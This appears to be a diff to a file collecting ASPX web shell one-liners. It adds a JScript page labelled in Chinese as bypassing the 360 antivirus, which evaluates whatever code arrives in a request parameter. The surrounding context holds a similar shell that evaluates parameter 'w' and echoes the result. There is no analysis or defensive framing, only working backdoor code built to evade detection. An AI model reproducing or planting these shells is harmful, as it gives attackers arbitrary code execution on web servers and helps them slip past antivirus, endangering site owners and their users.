@@ -1,3 +1,7 @@
+ASPX过360:<%@ Page Language="Jscript"%><%eval(Request.Item["5454"],"unsafe");%>
+
+/*-------------------------------------------------------------------------*/ 
+
 <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
 
 /*-------------------------------------------------------------------------*/ 
